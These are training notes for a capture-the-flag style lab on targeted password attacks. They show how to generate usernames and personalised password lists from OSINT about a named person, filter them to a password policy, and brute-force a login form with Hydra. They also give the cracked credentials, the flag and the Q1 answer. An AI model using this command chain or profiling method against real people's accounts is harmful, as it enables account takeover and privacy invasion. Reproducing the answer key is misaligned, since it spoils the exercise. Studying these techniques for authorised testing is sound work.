# Section 11 — Custom Wordlists

---

## Why Custom Wordlists?

Generic lists like rockyou cast a wide net but are inefficient for specific targets. Custom wordlists built from OSINT on the target dramatically narrow the search space and increase hit rate.

**Two tools for this:**
- **Username Anarchy** — generates username variations from a real name
- **CUPP** — generates personalized password lists from OSINT profile data

---

## Username Anarchy

Generates every common username format from a first/last name.

### Install
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

### Generate usernames
```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

**What it produces** (14 variations for Jane Smith):
```
jane, janesmith, jane.smith, j.smith, janes, smithjane, smith, 
smithj, smith.j, smith.jane, JSmith, jane1, js, Jane.Smith ...
```

**When to use:** Any time you know the target's real name and need to enumerate possible login usernames — corporate portals, AD accounts, web apps.

---

## CUPP — Common User Passwords Profiler

Builds a personalized password list from OSINT about the target.

### Install
```bash
git clone https://github.com/Mebus/cupp.git
# or: sudo apt install cupp -y
```

### Run interactively
```bash
python3 cupp/cupp.py -i
```

Feed it everything you found during recon — the more detail, the better the list.

**Example profile (Jane Smith):**
| Field | Value |
|-------|-------|
| First Name | Jane |
| Surname | Smith |
| Nickname | Janey |
| Birthdate | 11121990 |
| Partner | Jim (Jimbo) |
| Partner DOB | 12121990 |
| Pet | Spot |
| Company | AHI |
| Keywords | hacker, blue |
| Special chars | Yes |
| Random numbers | Yes |
| Leet mode | Yes |

**Output:** `jane.txt` — ~48,000 password variations including:
- `Jane`, `jane`, `enaj` (reversed)
- `jane1990`, `smith1112`, `Janey!`
- `j4n3`, `5p0t`, `J@n3y!!`
- Combinations with partner, pet, company, keywords

---

## Filtering to Match a Password Policy

After CUPP generates the list, filter it down to only passwords that comply with the target's policy — massively reduces attack time.

**Example policy:** Min 6 chars, uppercase, lowercase, number, 2+ special chars from `!@#$%^&*`

```bash
grep -E '^.{6,}$' jane.txt \
  | grep -E '[A-Z]' \
  | grep -E '[a-z]' \
  | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' \
  > jane-filtered.txt
```

| Filter | Regex | Purpose |
|--------|-------|---------|
| Min length | `^.{6,}$` | At least 6 characters |
| Uppercase | `[A-Z]` | At least one uppercase |
| Lowercase | `[a-z]` | At least one lowercase |
| Number | `[0-9]` | At least one digit |
| 2+ special chars | `([!@#$%^&*].*){2,}` | Two or more special chars from allowed set |

**Result:** ~48,000 → ~7,900 candidates.

---

## Lab — Custom Wordlist Attack

**Objective:** Build targeted username and password lists from OSINT on "Jane Smith," filter to policy, brute-force the login form.

**Why custom lists work here:** Generic lists won't contain `3n4J!!` — a CUPP-generated leet+special-char mutation of Jane's name. Only a targeted list finds it.

---

### Full Command Chain

```bash
# 1. Generate usernames
./username-anarchy Jane Smith > jane_smith_usernames.txt

# 2. Generate passwords with CUPP (pipe answers in non-interactively)
printf "Jane\nSmith\nJaney\n11121990\nJim\nJimbo\n12121990\n\n\n\nSpot\nAHI\ny\nhacker,blue\ny\ny\ny\nn\n" \
  | python3 cupp/cupp.py -i

# 3. Filter to policy
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' \
  | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# 4. Brute force with Hydra
hydra -L jane_smith_usernames.txt -P jane-filtered.txt TARGET_IP \
  -s TARGET_PORT -f -t 64 \
  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# 5. Log in and get the flag
curl -s -X POST http://TARGET_IP:TARGET_PORT/ \
  -d "username=jane&password=3n4J!!" -c /tmp/cookies.txt
curl -s -b /tmp/cookies.txt http://TARGET_IP:TARGET_PORT/success
```

**Credentials found:** `jane : 3n4J!!`

**Result:**
```
HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
```

**Q1 Answer:** `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`

---

## OSINT Sources for CUPP

| Source | What to look for |
|--------|-----------------|
| Social media (Facebook, Instagram) | Birthdate, pet names, hobbies, partner names, favorite quotes |
| LinkedIn | Company name, job title, industry keywords |
| Company website | Department, colleagues, email format |
| Public records | Address, family members |
| News/blogs | Affiliations, achievements, interests |

---

## Exam Notes

- Always build custom lists when you have a target name — generic lists won't find mutation-based passwords
- Filter CUPP output to the target's password policy before running — cuts runtime by 80–90%
- `([!@#$%^&*].*){2,}` requires the special chars to appear at least twice (greedy match) — adjust the set to match the allowed chars in the policy
- Username Anarchy + CUPP is the standard combo for targeted individual accounts
- CUPP non-interactive tip: pipe answers with `printf` to avoid the interactive prompt in scripts
